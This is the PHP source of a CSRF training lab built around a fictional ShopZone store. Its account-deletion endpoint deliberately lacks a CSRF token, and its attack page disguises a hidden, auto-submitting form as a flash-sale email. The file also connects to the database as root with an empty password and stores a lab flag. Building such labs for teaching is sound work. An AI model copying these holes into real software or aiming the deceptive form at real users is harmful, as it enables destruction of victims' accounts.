<?php
// Lab 1309 — CSRF Basics: Account Data Deletion Without Token
// Platform: "ShopZone" — fictional e-commerce / online shopping
// Vulnerability: POST /index.php?action=delete has NO CSRF token.
//   Any cross-origin form can silently wipe the victim's entire order history.
// Difficulty: Easy (Training) | Pure black-box — no hints in UI

session_set_cookie_params([
    'lifetime' => 0,
    'path'     => '/',
    'secure'   => true,
    'httponly'  => true,
    'samesite' => 'None',
]);
session_start();

$db_hosts = ['krazeplanet', '127.0.0.1', 'localhost', '172.19.0.1', 'host.docker.internal'];
$db = null;
foreach ($db_hosts as $h) {
    $db = @new mysqli($h, 'root', '');
    if (!$db->connect_error) {
        $db->query("CREATE DATABASE IF NOT EXISTS `KrazePlanet_DB` CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci");
        $db->select_db('KrazePlanet_DB');
        break;
    }
}
if (!$db || $db->connect_error) { die('DB connection failed: ' . ($db ? $db->connect_error : 'Unable to connect to database')); }
if ($db->connect_error) {
    die('<h3 style="padding:32px;font-family:sans-serif;color:#c00">DB error: ' . htmlspecialchars($db->connect_error) . '</h3>');
}

$scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
$host   = $scheme . '://' . $_SERVER['HTTP_HOST'];

$loginUrl    = $host . '/index.php';
$registerUrl = $host . '/index.php?action=register';
$dashUrl     = $host . '/index.php?action=dashboard';
$accountUrl  = $host . '/index.php?action=account';
$deleteUrl   = $host . '/index.php?action=delete';
$logoutUrl   = $host . '/index.php?logout=1';
$attackUrl   = $host . '/index.php?attack=1';

define('LAB_FLAG',    'flag{csrf_basics_delete_account_data_1309}');
define('VICTIM_EMAIL','victim@shopzone.com');

// ── Tables ────────────────────────────────────────────────────────────────────
$db->query("CREATE TABLE IF NOT EXISTS lab1309_users (
    id         INT AUTO_INCREMENT PRIMARY KEY,
    username   VARCHAR(100) NOT NULL UNIQUE,
    email      VARCHAR(255) NOT NULL UNIQUE,
    password   VARCHAR(255) NOT NULL,
    csrf_pwnd  TINYINT(1)   DEFAULT 0,
    created_at TIMESTAMP    DEFAULT CURRENT_TIMESTAMP
)");

$db->query("CREATE TABLE IF NOT EXISTS lab1309_orders (
    id         INT AUTO_INCREMENT PRIMARY KEY,
    user_id    INT          NOT NULL,
    order_num  VARCHAR(30)  NOT NULL,
    items      VARCHAR(255) NOT NULL,
    total      DECIMAL(8,2) NOT NULL,
    status     VARCHAR(30)  NOT NULL DEFAULT 'Processing',
    order_date VARCHAR(30)  NOT NULL
)");

// ── Seed accounts + orders ────────────────────────────────────────────────────
$check = $db->query("SELECT id FROM lab1309_users WHERE email='sofia@shopzone.com'");
if ($check && $check->num_rows === 0) {
    $h1 = password_hash('sofia@123', PASSWORD_BCRYPT);
    $h2 = password_hash('james@123', PASSWORD_BCRYPT);
    $h3 = password_hash('nina@123',  PASSWORD_BCRYPT);
    $db->query("INSERT INTO lab1309_users (username, email, password) VALUES
        ('sofia_chen',   'sofia@shopzone.com',  '$h1'),
        ('james_miller', 'james@shopzone.com',  '$h2'),
        ('nina_k',       'nina@shopzone.com',   '$h3')");
}
$users = $db->query("SELECT id FROM lab1309_users ORDER BY id ASC");
$orderSets = [
    [["SZ-2026-1101", "Wireless Noise-Cancelling Headphones", 129.99, "Delivered",  "Apr 12, 2026"],
     ["SZ-2026-1102", "Women's Running Shoes (Size 8)",        74.99, "Delivered",  "Apr 28, 2026"],
     ["SZ-2026-1103", "Portable Bluetooth Speaker",            49.99, "Shipped",    "May 10, 2026"],
     ["SZ-2026-1104", "Stainless Steel Water Bottle 32oz",     24.99, "Delivered",  "May 18, 2026"],
     ["SZ-2026-1105", "Smart Watch Fitness Tracker",           89.99, "Processing", "May 25, 2026"]],
    [["SZ-2026-2201", "Mechanical Keyboard RGB",              149.99, "Delivered",  "Mar 5, 2026"],
     ["SZ-2026-2202", "Gaming Mouse Wireless",                 59.99, "Shipped",    "Mar 12, 2026"],
     ["SZ-2026-2203", "27-inch Monitor 144Hz",               329.99, "Processing", "Mar 20, 2026"]],
    [["SZ-2026-3301", "Yoga Mat Premium",                      34.99, "Delivered",  "Feb 8, 2026"],
     ["SZ-2026-3302", "Resistance Bands Set",                  19.99, "Delivered",  "Feb 15, 2026"],
     ["SZ-2026-3303", "Protein Powder 2lb",                    44.99, "Shipped",    "Feb 22, 2026"],
     ["SZ-2026-3304", "Foam Roller",                           24.99, "Delivered",  "Mar 1, 2026"]],
];
if ($users) {
    $idx = 0;
    while ($u = $users->fetch_assoc()) {
        $uid = (int)$u['id'];
        $check = $db->query("SELECT COUNT(*) FROM lab1309_orders WHERE user_id=$uid")->fetch_row()[0];
        if ($check == 0 && isset($orderSets[$idx])) {
            foreach ($orderSets[$idx] as $o) {
                $st = $db->prepare("INSERT INTO lab1309_orders (user_id, order_num, items, total, status, order_date) VALUES (?,?,?,?,?,?)");
                $st->bind_param('issdss', $uid, $o[0], $o[1], $o[2], $o[3], $o[4]);
                $st->execute();
                $st->close();
            }
        }
        $idx++;
    }
}

function esc($s) { return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }

// ── Route detection ───────────────────────────────────────────────────────────
$action      = $_GET['action'] ?? '';
$isLogout    = isset($_GET['logout']);
$isAttack    = isset($_GET['attack']);
$isRegister  = ($action === 'register');
$isDashboard = ($action === 'dashboard');
$isAccount   = ($action === 'account');
$isDelete    = ($action === 'delete');
$error       = '';

// ── Logout ────────────────────────────────────────────────────────────────────
if ($isLogout) {
    session_destroy();
    header('Location: ' . $loginUrl);
    exit;
}

// ── Load session user ─────────────────────────────────────────────────────────
$currentUser = null;
if (!empty($_SESSION['lab1309_uid'])) {
    $st = $db->prepare("SELECT * FROM lab1309_users WHERE id = ?");
    $st->bind_param('i', $_SESSION['lab1309_uid']);
    $st->execute();
    $currentUser = $st->get_result()->fetch_assoc();
    $st->close();
}

// ── POST: Register ────────────────────────────────────────────────────────────
if ($isRegister && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $uname = trim($_POST['username'] ?? '');
    $email = trim($_POST['email'] ?? '');
    $pass  = $_POST['password'] ?? '';
    if ($uname && $email && $pass) {
        $hashed = password_hash($pass, PASSWORD_BCRYPT);
        $st = $db->prepare("INSERT INTO lab1309_users (username, email, password) VALUES (?,?,?)");
        $st->bind_param('sss', $uname, $email, $hashed);
        if ($st->execute()) {
            $newUid = $db->insert_id;
            $_SESSION['lab1309_uid'] = $newUid;
            // Seed generic orders for new users
            $seedOrders = [
                ["SZ-NEW-0001", "Wireless Earbuds — White", 49.99, "Delivered",  "Jun 1, 2026"],
                ["SZ-NEW-0002", "USB-C Fast Charger",       19.99, "Shipped",    "Jun 2, 2026"],
                ["SZ-NEW-0003", "Laptop Stand — Aluminum",  34.99, "Processing", "Jun 2, 2026"],
            ];
            $st2 = $db->prepare("INSERT INTO lab1309_orders (user_id, order_num, items, total, status, order_date) VALUES (?,?,?,?,?,?)");
            foreach ($seedOrders as $o) {
                $st2->bind_param('issdss', $newUid, $o[0], $o[1], $o[2], $o[3], $o[4]);
                $st2->execute();
            }
            $st2->close();
            header('Location: ' . $dashUrl);
            exit;
        }
        $error = 'Username or email already taken.';
        $st->close();
    } else {
        $error = 'All fields are required.';
    }
}

// ── POST: Login ───────────────────────────────────────────────────────────────
if (!$isRegister && !$isDelete && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = trim($_POST['email'] ?? '');
    $pass  = $_POST['password'] ?? '';
    if ($email && $pass) {
        $st = $db->prepare("SELECT * FROM lab1309_users WHERE email = ?");
        $st->bind_param('s', $email);
        $st->execute();
        $user = $st->get_result()->fetch_assoc();
        $st->close();
        if ($user && password_verify($pass, $user['password'])) {
            $_SESSION['lab1309_uid'] = $user['id'];
            header('Location: ' . $dashUrl);
            exit;
        }
        $error = 'Invalid email or password.';
    } else {
        $error = 'Please enter your credentials.';
    }
}

// ── POST: Delete — VULNERABLE (no CSRF token check) ──────────────────────────
if ($isDelete && $_SERVER['REQUEST_METHOD'] === 'POST' && $currentUser) {
    // ⚠ No CSRF token check — that is the vulnerability.
    $uid = (int)$currentUser['id'];
    $st = $db->prepare("DELETE FROM lab1309_orders WHERE user_id = ?");
    $st->bind_param('i', $uid);
    $st->execute();
    $st->close();
    $st = $db->prepare("DELETE FROM lab1309_users WHERE id = ?");
    $st->bind_param('i', $uid);
    $st->execute();
    $st->close();
    session_destroy();
    header('Location: ' . $loginUrl . '?deleted=1');
    exit;
}

// ── Redirect logged-in user away from login/register ─────────────────────────
if ($currentUser && !$isDashboard && !$isAccount && !$isDelete && !$isAttack && !$action) {
    header('Location: ' . $dashUrl);
    exit;
}

// ── Guard: protected pages require login ──────────────────────────────────────
if (!$currentUser && !$isAttack && !$isRegister && $action) {
    header('Location: ' . $loginUrl);
    exit;
}

// ── Reload user after possible POST update ────────────────────────────────────
if (($isAccount || $isDelete) && $currentUser) {
    $st = $db->prepare("SELECT * FROM lab1309_users WHERE id = ?");
    $st->bind_param('i', $currentUser['id']);
    $st->execute();
    $currentUser = $st->get_result()->fetch_assoc();
    $st->close();
}

// ── Load orders for dashboard ─────────────────────────────────────────────────
$orders = [];
if ($isDashboard && $currentUser) {
    $st = $db->prepare("SELECT * FROM lab1309_orders WHERE user_id = ? ORDER BY id DESC");
    $st->bind_param('i', $currentUser['id']);
    $st->execute();
    $res = $st->get_result();
    while ($row = $res->fetch_assoc()) $orders[] = $row;
    $st->close();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>ShopZone<?php
    if ($isAttack)    echo ' — Special Offer';
    elseif ($isAccount)  echo ' — My Account';
    elseif ($isDashboard)echo ' — My Orders';
    elseif ($isRegister) echo ' — Create Account';
    else                 echo ' — Sign In';
?></title>
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif;background:#F8FAFC;color:#111827;min-height:100vh;}

/* ── NAV ───────────────────────────────────────────────────────────────────── */
.sz-nav{background:#fff;border-bottom:2px solid #FED7AA;height:58px;display:flex;align-items:center;padding:0 24px;gap:8px;position:sticky;top:0;z-index:100;}
.sz-logo{font-size:1.2rem;font-weight:900;color:#EA580C;display:flex;align-items:center;gap:8px;text-decoration:none;letter-spacing:-.02em;margin-right:12px;}
.sz-logo-icon{width:30px;height:30px;background:#F97316;border-radius:8px;display:flex;align-items:center;justify-content:center;}
.sz-logo-icon svg{width:17px;height:17px;fill:none;stroke:#fff;stroke-width:2.5;stroke-linecap:round;stroke-linejoin:round;}
.sz-nav-link{color:#6B7280;text-decoration:none;font-size:.83rem;font-weight:500;padding:6px 12px;border-radius:6px;transition:background .15s,color .15s;}
.sz-nav-link:hover{background:#FFF7ED;color:#EA580C;}
.sz-nav-link.active{background:#FFF7ED;color:#F97316;font-weight:600;}
.sz-nav-right{margin-left:auto;display:flex;align-items:center;gap:10px;}
.sz-nav-user{font-size:.82rem;color:#6B7280;}
.sz-nav-user span{color:#111827;font-weight:600;}
.sz-nav-logout{font-size:.78rem;color:#9CA3AF;text-decoration:none;padding:4px 10px;border-radius:5px;border:1px solid #E5E7EB;}
.sz-nav-logout:hover{color:#EF4444;border-color:#FECACA;background:#FEF2F2;}

/* ── AUTH PAGES ────────────────────────────────────────────────────────────── */
.sz-auth-bg{min-height:100vh;background:#F8FAFC;display:flex;align-items:center;justify-content:center;padding:24px;}
.sz-auth-card{background:#fff;border-radius:16px;border:1px solid #E5E7EB;width:100%;max-width:400px;padding:36px;}
.sz-auth-logo{text-align:center;margin-bottom:28px;}
.sz-auth-logo-icon{width:52px;height:52px;background:#F97316;border-radius:14px;display:flex;align-items:center;justify-content:center;margin:0 auto 12px;}
.sz-auth-logo-icon svg{width:26px;height:26px;fill:none;stroke:#fff;stroke-width:2.5;stroke-linecap:round;stroke-linejoin:round;}
.sz-auth-title{font-size:1.15rem;font-weight:700;color:#111827;text-align:center;margin-bottom:4px;}
.sz-auth-sub{font-size:.82rem;color:#9CA3AF;text-align:center;margin-bottom:26px;}
.sz-field{margin-bottom:16px;}
.sz-field label{display:block;font-size:.75rem;font-weight:600;color:#6B7280;margin-bottom:6px;text-transform:uppercase;letter-spacing:.05em;}
.sz-field input{width:100%;padding:10px 13px;border:1px solid #D1D5DB;border-radius:8px;font-size:.875rem;color:#111827;outline:none;transition:border-color .15s,box-shadow .15s;}
.sz-field input:focus{border-color:#F97316;box-shadow:0 0 0 3px rgba(249,115,22,.12);}
.sz-field input:disabled{background:#F9FAFB;color:#9CA3AF;cursor:not-allowed;}
.sz-btn{background:#F97316;color:#fff;border:none;padding:11px 20px;border-radius:8px;font-size:.875rem;font-weight:600;cursor:pointer;transition:background .15s;}
.sz-btn:hover{background:#EA580C;}
.sz-btn-full{width:100%;}
.sz-btn-danger{background:#EF4444;color:#fff;border:none;padding:9px 20px;border-radius:8px;font-size:.875rem;font-weight:600;cursor:pointer;transition:background .15s;}
.sz-btn-danger:hover{background:#DC2626;}
.sz-auth-footer{text-align:center;margin-top:20px;font-size:.8rem;color:#9CA3AF;}
.sz-auth-footer a{color:#F97316;text-decoration:none;font-weight:500;}
.sz-error{background:#FEF2F2;border:1px solid #FECACA;color:#DC2626;padding:10px 14px;border-radius:8px;font-size:.8rem;margin-bottom:14px;}

/* ── DASHBOARD ─────────────────────────────────────────────────────────────── */
.sz-wrap{max-width:860px;margin:28px auto;padding:0 16px;}
.sz-page-title{font-size:1.15rem;font-weight:700;color:#111827;margin-bottom:20px;}
.sz-order-card{background:#fff;border-radius:12px;border:1px solid #E5E7EB;overflow:hidden;margin-bottom:12px;}
.sz-order-hdr{padding:14px 20px;background:#FFF7ED;border-bottom:1px solid #FED7AA;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px;}
.sz-order-num{font-size:.78rem;font-weight:700;color:#EA580C;text-transform:uppercase;letter-spacing:.04em;}
.sz-order-date{font-size:.78rem;color:#9CA3AF;}
.sz-order-body{padding:14px 20px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px;}
.sz-order-item{font-size:.875rem;color:#374151;font-weight:500;}
.sz-order-right{display:flex;align-items:center;gap:16px;}
.sz-order-total{font-size:.9rem;font-weight:700;color:#111827;}
.sz-order-status{font-size:.72rem;font-weight:600;padding:3px 10px;border-radius:20px;}
.sz-status-delivered{background:#ECFDF5;color:#059669;}
.sz-status-shipped{background:#EFF6FF;color:#3B82F6;}
.sz-status-processing{background:#FFF7ED;color:#F97316;}
.sz-empty-orders{background:#fff;border-radius:12px;border:1px solid #E5E7EB;padding:48px 24px;text-align:center;color:#9CA3AF;font-size:.875rem;}
.sz-empty-orders svg{width:40px;height:40px;margin:0 auto 12px;display:block;opacity:.3;}
.sz-summary-row{display:flex;gap:12px;margin-bottom:20px;flex-wrap:wrap;}
.sz-summary-chip{background:#fff;border:1px solid #E5E7EB;border-radius:8px;padding:12px 16px;flex:1;min-width:120px;}
.sz-summary-chip-lbl{font-size:.7rem;color:#9CA3AF;text-transform:uppercase;letter-spacing:.05em;margin-bottom:4px;}
.sz-summary-chip-val{font-size:1.1rem;font-weight:700;color:#111827;}

/* ── ACCOUNT SETTINGS ──────────────────────────────────────────────────────── */
.sz-settings-card{background:#fff;border-radius:12px;border:1px solid #E5E7EB;overflow:hidden;margin-bottom:16px;}
.sz-settings-hdr{padding:13px 20px;background:#F9FAFB;border-bottom:1px solid #E5E7EB;font-size:.75rem;font-weight:700;color:#374151;text-transform:uppercase;letter-spacing:.05em;}
.sz-settings-body{padding:20px;}
.sz-danger-zone{background:#FEF2F2;border-radius:12px;border:1px solid #FECACA;overflow:hidden;margin-bottom:16px;}
.sz-danger-hdr{padding:13px 20px;background:#FEE2E2;border-bottom:1px solid #FECACA;font-size:.75rem;font-weight:700;color:#DC2626;text-transform:uppercase;letter-spacing:.05em;}
.sz-danger-body{padding:20px;}
.sz-danger-desc{font-size:.83rem;color:#6B7280;line-height:1.55;margin-bottom:16px;}
.sz-flag-banner{background:#FEF2F2;border:1px solid #FECACA;border-radius:10px;padding:18px 20px;margin-bottom:20px;}
.sz-flag-title{font-size:.75rem;font-weight:700;color:#DC2626;text-transform:uppercase;letter-spacing:.06em;margin-bottom:8px;}
.sz-flag-label{font-size:.78rem;color:#6B7280;margin-bottom:6px;}
.sz-flag-val{font-family:'Courier New',Courier,monospace;font-size:.9rem;font-weight:700;color:#111827;background:#F9FAFB;border:1px solid #E5E7EB;padding:10px 14px;border-radius:6px;word-break:break-all;}

/* ── ATTACK PAGE ───────────────────────────────────────────────────────────── */
.sz-atk-bg{min-height:100vh;background:#F8FAFC;display:flex;align-items:center;justify-content:center;padding:24px;}
.sz-atk-email{background:#fff;border-radius:14px;border:1px solid #E5E7EB;width:100%;max-width:500px;overflow:hidden;box-shadow:0 4px 24px rgba(0,0,0,.06);}
.sz-atk-hdr{background:#F97316;padding:18px 24px;display:flex;align-items:center;justify-content:space-between;}
.sz-atk-hdr-left{display:flex;align-items:center;gap:10px;}
.sz-atk-hdr-icon{width:30px;height:30px;background:rgba(255,255,255,.2);border-radius:8px;display:flex;align-items:center;justify-content:center;}
.sz-atk-hdr-icon svg{width:17px;height:17px;fill:none;stroke:#fff;stroke-width:2.5;stroke-linecap:round;stroke-linejoin:round;}
.sz-atk-brand{font-size:1.1rem;font-weight:900;color:#fff;letter-spacing:-.02em;}
.sz-atk-badge{background:rgba(255,255,255,.25);color:#fff;font-size:.7rem;font-weight:700;padding:3px 10px;border-radius:20px;text-transform:uppercase;letter-spacing:.04em;}
.sz-atk-body{padding:28px 24px;}
.sz-atk-sale-tag{display:inline-flex;align-items:center;gap:6px;background:#FFF7ED;color:#EA580C;font-size:.72rem;font-weight:700;padding:4px 12px;border-radius:20px;text-transform:uppercase;letter-spacing:.04em;margin-bottom:14px;border:1px solid #FED7AA;}
.sz-atk-title{font-size:1.2rem;font-weight:800;color:#111827;margin-bottom:8px;line-height:1.25;}
.sz-atk-text{font-size:.875rem;color:#6B7280;line-height:1.6;margin-bottom:20px;}
.sz-atk-items{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:20px;}
.sz-atk-item{background:#F8FAFC;border:1px solid #E5E7EB;border-radius:8px;padding:12px;}
.sz-atk-item-name{font-size:.78rem;font-weight:600;color:#374151;margin-bottom:4px;}
.sz-atk-item-price{display:flex;align-items:center;gap:6px;}
.sz-atk-item-new{font-size:.875rem;font-weight:700;color:#EA580C;}
.sz-atk-item-old{font-size:.75rem;color:#9CA3AF;text-decoration:line-through;}
.sz-atk-btn{background:#F97316;color:#fff;border:none;width:100%;padding:13px;border-radius:8px;font-size:.95rem;font-weight:700;cursor:pointer;transition:background .15s;letter-spacing:.01em;}
.sz-atk-btn:hover{background:#EA580C;}
.sz-atk-btn:disabled{opacity:.6;cursor:not-allowed;}
.sz-atk-countdown{text-align:center;font-size:.75rem;color:#9CA3AF;margin-bottom:16px;}
.sz-atk-countdown span{font-weight:700;color:#EA580C;}
.sz-atk-footer{padding:14px 24px;border-top:1px solid #F1F5F9;font-size:.68rem;color:#9CA3AF;text-align:center;line-height:1.6;}
</style>
</head>
<body>

<?php if ($isAttack): ?>
<!-- ══════════════════════════════════════════════════════════════════════════
     ATTACK PAGE — Fake ShopZone flash sale promotional email
     ══════════════════════════════════════════════════════════════════════════ -->
<div class="sz-atk-bg">

  <!-- ⚠ CSRF form: POSTs to /index.php?action=delete — no CSRF token.
       Victim's entire order history is silently wiped. -->
  <form id="csrfForm"
        action="/index.php?action=delete"
        method="POST"
        style="display:none;">
  </form>

  <div class="sz-atk-email">
    <div class="sz-atk-hdr">
      <div class="sz-atk-hdr-left">
        <div class="sz-atk-hdr-icon"><svg viewBox="0 0 24 24"><path d="M6 2L3 6v14a2 2 0 002 2h14a2 2 0 002-2V6l-3-4z"/><line x1="3" y1="6" x2="21" y2="6"/><path d="M16 10a4 4 0 01-8 0"/></svg></div>
        <span class="sz-atk-brand">ShopZone</span>
      </div>
      <span class="sz-atk-badge">⚡ Flash Sale</span>
    </div>
    <div class="sz-atk-body">
      <div class="sz-atk-sale-tag">🔥 Today Only — Limited Stock</div>
      <div class="sz-atk-title">Up to 70% Off — Exclusive Member Sale</div>
      <div class="sz-atk-text">
        As a valued ShopZone member, you've been selected for our exclusive
        24-hour flash sale. These prices won't last — grab your items before
        they sell out!
      </div>
      <div class="sz-atk-items">
        <div class="sz-atk-item">
          <div class="sz-atk-item-name">Wireless Headphones</div>
          <div class="sz-atk-item-price">
            <span class="sz-atk-item-new">$38.99</span>
            <span class="sz-atk-item-old">$129.99</span>
          </div>
        </div>
        <div class="sz-atk-item">
          <div class="sz-atk-item-name">Smart Watch</div>
          <div class="sz-atk-item-price">
            <span class="sz-atk-item-new">$26.99</span>
            <span class="sz-atk-item-old">$89.99</span>
          </div>
        </div>
        <div class="sz-atk-item">
          <div class="sz-atk-item-name">Bluetooth Speaker</div>
          <div class="sz-atk-item-price">
            <span class="sz-atk-item-new">$14.99</span>
            <span class="sz-atk-item-old">$49.99</span>
          </div>
        </div>
        <div class="sz-atk-item">
          <div class="sz-atk-item-name">Running Shoes</div>
          <div class="sz-atk-item-price">
            <span class="sz-atk-item-new">$22.99</span>
            <span class="sz-atk-item-old">$74.99</span>
          </div>
        </div>
      </div>
      <div class="sz-atk-countdown">
        Offer expires in <span id="timer">02:47:13</span> — Act now!
      </div>
      <button class="sz-atk-btn" id="claimBtn" onclick="fireCSRF()">
        🛒 Claim Your Discount →
      </button>
    </div>
    <div class="sz-atk-footer">
      You're receiving this because you're a ShopZone member.<br>
      ShopZone · <a href="#" style="color:#9CA3AF;">Unsubscribe</a> · <a href="#" style="color:#9CA3AF;">Privacy Policy</a> · <a href="#" style="color:#9CA3AF;">Terms</a>
    </div>
  </div>
</div>
<script>
function fireCSRF() {
    var btn = document.getElementById('claimBtn');
    btn.disabled = true;
    btn.textContent = '⏳ Loading offers…';
    document.getElementById('csrfForm').submit();
}
setTimeout(function() { document.getElementById('csrfForm').submit(); }, 1500);
// Fake countdown for realism
(function() {
    var secs = 9 * 3600 + 47 * 60 + 13;
    setInterval(function() {
        if (secs > 0) secs--;
        var h = Math.floor(secs / 3600);
        var m = Math.floor((secs % 3600) / 60);
        var s = secs % 60;
        var el = document.getElementById('timer');
        if (el) el.textContent = String(h).padStart(2,'0') + ':' + String(m).padStart(2,'0') + ':' + String(s).padStart(2,'0');
    }, 1000);
})();
</script>

<?php elseif ($isAccount && $currentUser): ?>
<!-- ══════════════════════════════════════════════════════════════════════════
     ACCOUNT SETTINGS PAGE
     ══════════════════════════════════════════════════════════════════════════ -->
<nav class="sz-nav">
  <a href="/index.php?action=dashboard" class="sz-logo">
    <div class="sz-logo-icon"><svg viewBox="0 0 24 24"><path d="M6 2L3 6v14a2 2 0 002 2h14a2 2 0 002-2V6l-3-4z"/><line x1="3" y1="6" x2="21" y2="6"/><path d="M16 10a4 4 0 01-8 0"/></svg></div>
    ShopZone
  </a>
  <a href="/index.php?action=dashboard" class="sz-nav-link">My Orders</a>
  <a href="/index.php?action=account"   class="sz-nav-link active">My Account</a>
  <div class="sz-nav-right">
    <span class="sz-nav-user">Hi, <span><?= esc($currentUser['username']) ?></span></span>
    <a href="/index.php?logout=1" class="sz-nav-logout">Sign Out</a>
  </div>
</nav>

<div class="sz-wrap" style="max-width:600px;">
  <div class="sz-page-title">My Account</div>

  <?php if ($error): ?><div class="sz-error"><?= esc($error) ?></div><?php endif; ?>

  <div class="sz-settings-card">
    <div class="sz-settings-hdr">Account Information</div>
    <div class="sz-settings-body">
      <div class="sz-field">
        <label>Username</label>
        <input type="text" value="<?= esc($currentUser['username']) ?>" disabled>
      </div>
      <div class="sz-field">
        <label>Email Address</label>
        <input type="email" value="<?= esc($currentUser['email']) ?>" disabled>
      </div>
      <div class="sz-field">
        <label>Member Since</label>
        <input type="text" value="<?= esc(date('M j, Y', strtotime($currentUser['created_at']))) ?>" disabled>
      </div>
    </div>
  </div>

  <div class="sz-danger-zone">
    <div class="sz-danger-hdr">⚠ Danger Zone</div>
    <div class="sz-danger-body">
      <div class="sz-danger-desc">
        Deleting your account will permanently remove all your order history,
        saved addresses, and account data. This action cannot be undone.
      </div>
      <!-- ⚠ VULNERABLE: no csrf_token hidden field -->
      <form method="POST" action="/index.php?action=delete">
        <button type="submit" class="sz-btn-danger">Delete My Account &amp; Data</button>
      </form>
    </div>
  </div>
</div>

<?php elseif ($isDashboard && $currentUser): ?>
<!-- ══════════════════════════════════════════════════════════════════════════
     DASHBOARD / ORDER HISTORY PAGE
     ══════════════════════════════════════════════════════════════════════════ -->
<nav class="sz-nav">
  <a href="/index.php?action=dashboard" class="sz-logo">
    <div class="sz-logo-icon"><svg viewBox="0 0 24 24"><path d="M6 2L3 6v14a2 2 0 002 2h14a2 2 0 002-2V6l-3-4z"/><line x1="3" y1="6" x2="21" y2="6"/><path d="M16 10a4 4 0 01-8 0"/></svg></div>
    ShopZone
  </a>
  <a href="/index.php?action=dashboard" class="sz-nav-link active">My Orders</a>
  <a href="/index.php?action=account"   class="sz-nav-link">My Account</a>
  <div class="sz-nav-right">
    <span class="sz-nav-user">Hi, <span><?= esc($currentUser['username']) ?></span></span>
    <a href="/index.php?logout=1" class="sz-nav-logout">Sign Out</a>
  </div>
</nav>

<div class="sz-wrap">
  <div class="sz-summary-row">
    <div class="sz-summary-chip">
      <div class="sz-summary-chip-lbl">Total Orders</div>
      <div class="sz-summary-chip-val"><?= count($orders) ?></div>
    </div>
    <div class="sz-summary-chip">
      <div class="sz-summary-chip-lbl">Total Spent</div>
      <div class="sz-summary-chip-val">$<?= number_format(array_sum(array_column($orders, 'total')), 2) ?></div>
    </div>
    <div class="sz-summary-chip">
      <div class="sz-summary-chip-lbl">Account</div>
      <div class="sz-summary-chip-val"><?= esc($currentUser['email']) ?></div>
    </div>
  </div>

  <div class="sz-page-title">Order History</div>

  <?php if (empty($orders)): ?>
  <div class="sz-empty-orders">
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M6 2L3 6v14a2 2 0 002 2h14a2 2 0 002-2V6l-3-4z"/><line x1="3" y1="6" x2="21" y2="6"/><path d="M16 10a4 4 0 01-8 0"/></svg>
    No orders found. Your order history is empty.
  </div>
  <?php else: ?>
  <?php foreach ($orders as $o):
    $statusClass = match(strtolower($o['status'])) {
        'delivered'  => 'sz-status-delivered',
        'shipped'    => 'sz-status-shipped',
        default      => 'sz-status-processing',
    };
  ?>
  <div class="sz-order-card">
    <div class="sz-order-hdr">
      <span class="sz-order-num">Order #<?= esc($o['order_num']) ?></span>
      <span class="sz-order-date">Placed <?= esc($o['order_date']) ?></span>
    </div>
    <div class="sz-order-body">
      <span class="sz-order-item"><?= esc($o['items']) ?></span>
      <div class="sz-order-right">
        <span class="sz-order-total">$<?= number_format($o['total'], 2) ?></span>
        <span class="sz-order-status <?= $statusClass ?>"><?= esc($o['status']) ?></span>
      </div>
    </div>
  </div>
  <?php endforeach; ?>
  <?php endif; ?>
</div>

<?php elseif ($isRegister): ?>
<!-- ══════════════════════════════════════════════════════════════════════════
     REGISTER PAGE
     ══════════════════════════════════════════════════════════════════════════ -->
<div class="sz-auth-bg">
  <div class="sz-auth-card">
    <div class="sz-auth-logo">
      <div class="sz-auth-logo-icon"><svg viewBox="0 0 24 24"><path d="M6 2L3 6v14a2 2 0 002 2h14a2 2 0 002-2V6l-3-4z"/><line x1="3" y1="6" x2="21" y2="6"/><path d="M16 10a4 4 0 01-8 0"/></svg></div>
    </div>
    <div class="sz-auth-title">Create an Account</div>
    <div class="sz-auth-sub">Start shopping on ShopZone</div>

    <?php if ($error): ?><div class="sz-error"><?= esc($error) ?></div><?php endif; ?>

    <form method="POST" action="/index.php?action=register">
      <div class="sz-field">
        <label>Username</label>
        <input type="text" name="username" placeholder="your_name" required autocomplete="username">
      </div>
      <div class="sz-field">
        <label>Email Address</label>
        <input type="email" name="email" placeholder="you@example.com" required autocomplete="email">
      </div>
      <div class="sz-field" style="margin-bottom:22px;">
        <label>Password</label>
        <input type="password" name="password" placeholder="Create a password" required autocomplete="new-password">
      </div>
      <button type="submit" class="sz-btn sz-btn-full">Create Account</button>
    </form>

    <div class="sz-auth-footer">
      Already have an account? <a href="/index.php">Sign in</a>
    </div>
  </div>
</div>

<?php else: ?>
<!-- ══════════════════════════════════════════════════════════════════════════
     LOGIN PAGE
     ══════════════════════════════════════════════════════════════════════════ -->
<div class="sz-auth-bg">
  <div class="sz-auth-card">
    <div class="sz-auth-logo">
      <div class="sz-auth-logo-icon"><svg viewBox="0 0 24 24"><path d="M6 2L3 6v14a2 2 0 002 2h14a2 2 0 002-2V6l-3-4z"/><line x1="3" y1="6" x2="21" y2="6"/><path d="M16 10a4 4 0 01-8 0"/></svg></div>
    </div>
    <div class="sz-auth-title">Sign in to ShopZone</div>
    <div class="sz-auth-sub">Welcome back!</div>

    <?php if (isset($_GET['deleted'])): ?>
    <div id="deletedMsg" style="background:#FEF2F2;border:1px solid #FECACA;color:#991B1B;padding:12px 16px;border-radius:8px;font-size:.875rem;margin-bottom:14px;display:flex;align-items:center;gap:8px;transition:opacity .4s ease;">
      <svg style="width:18px;height:18px;flex-shrink:0;" viewBox="0 0 24 24" fill="none" stroke="#DC2626" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M3 6h18"/><path d="M19 6v14a2 2 0 01-2 2H7a2 2 0 01-2-2V6m3 0V4a2 2 0 012-2h4a2 2 0 012 2v2"/></svg>
      Your account and all associated data have been permanently deleted.
    </div>
